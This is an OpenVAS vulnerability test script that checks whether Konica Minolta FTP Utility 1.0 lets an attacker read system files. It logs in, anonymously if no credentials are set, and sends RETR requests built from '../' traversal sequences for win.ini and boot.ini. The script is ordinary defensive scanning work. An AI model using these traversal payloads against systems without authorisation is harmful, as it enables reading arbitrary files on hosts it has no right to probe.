###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_konica_minolta_ftp_utility_mult_vuln.nasl 6170 2017-05-19 09:03:42Z teissa $
#
# Konica Minolta FTP Utility Multiple vulnerabilities
#
# Authors:
# Deependra Bapna <bdeependra@secpod.com>
#
# Copyright:
# Copyright (c) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:konicaminolta:ftp_utility";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805750");
  script_version("$Revision: 6170 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2017-05-19 11:03:42 +0200 (Fri, 19 May 2017) $");
  script_tag(name:"creation_date", value:"2015-09-28 13:43:21 +0530 (Mon, 28 Sep 2015)");
  script_name("Konica Minolta FTP Utility Multiple vulnerabilities");

  script_tag(name:"summary", value:"This host is running Konica Minolta FTP
  Utility and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send the crafted directory traversal attack
  request and check whether it is able to read the system file or not.");

  script_tag(name:"insight", value:"The flaw exists due to error in handling of
  file names. It does not properly sanitise filenames containing directory traversal
  sequences that are received from an FTP server.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers
  to read arbitrary files on the affected application or execute arbitrary command
  on the affected application.

  Impact Level: Application.");

  script_tag(name:"affected", value:"Konica Minolta FTP Utility version 1.0.");

  script_tag(name:"solution", value:"No solution or patch was made available
  for at least one year since disclosure of this vulnerability. Likely none will
  be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another
  one.");

  script_tag(name:"solution_type", value:"NoneAvailable");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/38260");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/38252");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("secpod_ftp_anonymous.nasl", "gb_konica_minolta_ftp_utility_detect.nasl");
  script_mandatory_keys("KonicaMinolta/Ftp/Installed");
  script_require_ports("Services/ftp", 21);
 exit(0);
}


include("ftp_func.inc");
include("host_details.inc");

## Variable initialization
login_details = "";
ftpPort = "";
banner = "";
soc = "";
user = "";
password = "";

## Get FTP Port
ftpPort = get_app_port(cpe:CPE);
if(!ftpPort){
  exit(0);
}

## create the socket
soc = open_sock_tcp(ftpPort);
if(!soc){
  exit(0);
}

## Get the FTP user name and password
user = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");

## if not user name is given try with anonymous
if(!user){
  user = "anonymous";
}

## if not password is given try with anonymous
if(!password){
  password = string("anonymous");
}

login_details = ftp_log_in(socket:soc, user:user, pass:password);
if(!login_details)
{
 close(soc);
 exit(0);
}

## Change to PASV Mode
ftpPort2 = ftp_get_pasv_port(socket:soc);
if(!ftpPort2)
{
  close(soc);
  exit(0);
}

## Open a Socket and Send Crafted request
soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(ftpPort));
if(!soc2)
{
  close(soc);
  exit(0);
}

## List the possible system files
files = make_list("windows/win.ini", "boot.ini", "winnt/win.ini");
foreach file (files)
{
  ## Construct the attack request
  file = "../../../../../../../../" + file;
  attackreq = string("RETR ", file);
  send(socket:soc, data:string(attackreq, "\r\n"));

  result = ftp_recv_data(socket:soc2);

  ## confirm the exploit
  if("\WINDOWS" >< result || "; for 16-bit app support" >< result
                                     || "[boot loader]" >< result)
  {
    security_message(port:ftpPort);
    close(soc2);
    close(soc);
    exit(0);
  }
}

close(soc);
close(soc2);
